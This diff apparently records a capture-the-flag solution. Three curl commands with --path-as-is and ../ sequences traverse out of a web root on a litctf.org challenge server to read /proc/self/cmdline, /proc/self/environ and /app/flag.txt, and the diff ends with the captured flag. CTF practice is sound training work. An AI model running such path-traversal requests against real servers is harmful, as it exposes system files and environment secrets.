@@ -1,0 +1,4 @@
+$ curl --path-as-is http://litctf.org:31778/../../../../../../proc/self/cmdline --output proc_self_cmdline
+$ curl --path-as-is http://litctf.org:31778/../../../../../../proc/self/environ --output proc_self_environ
+$ curl --path-as-is http://litctf.org:31778/../../../../../../app/flag.txt
+LITCTF{backtr@ked_230fim0}
